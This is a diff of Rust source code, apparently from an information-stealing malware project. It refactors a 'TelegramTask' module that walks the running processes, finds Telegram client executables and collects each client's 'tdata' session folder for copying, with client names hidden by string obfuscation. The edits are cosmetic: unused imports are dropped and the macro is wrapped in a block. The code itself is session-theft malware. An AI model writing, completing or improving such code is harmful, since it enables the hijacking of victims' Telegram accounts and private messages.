@@ -1,8 +1,5 @@
 use alloc::borrow::ToOwned;
-use alloc::fmt::format;
-use alloc::string::String;
 use alloc::sync::Arc;
-use alloc::vec::Vec;
 use alloc::{format, vec};
 use collector::{Collector, Software};
 use filesystem::path::Path;
@@ -10,7 +7,6 @@ use filesystem::storage::StorageFileSystem;
 use filesystem::{copy_file, copy_folder, FileSystem, FileSystemExt};
 use obfstr::obfstr as s;
 use tasks::Task;
-use utils::log_debug;
 use utils::process::{get_process_list, get_process_path_by_pid, ProcessInfo};
 
 pub(super) struct TelegramTask;
@@ -20,17 +16,20 @@ macro_rules! find_first_process {
         $client_name:expr,
         $processes:expr => $($process_name:expr),+ $(,)? => $extend:expr
     ) => {
-        let mut found = false;
-        $(
-            if !found {
-                if let Some(path) = find_process_path(obfstr::obfstr!($process_name), $processes)
-                    && let Some(path) = path.parent()
-                {
-                    $extend.extend([(obfstr::obfstr!($client_name).to_owned(), path / "tdata")]);
-                    found = true;
+        #[allow(unused_assignments)]
+        {
+            let mut found = false;
+            $(
+                if !found {
+                    if let Some(path) = find_process_path(obfstr::obfstr!($process_name), $processes)
+                        && let Some(path) = path.parent()
+                    {
+                        $extend.extend([(obfstr::obfstr!($client_name).to_owned(), path / "tdata")]);
+                        found = true;
+                    }
                 }
-            }
-        )+
+            )+
+        }
     };
 }
 
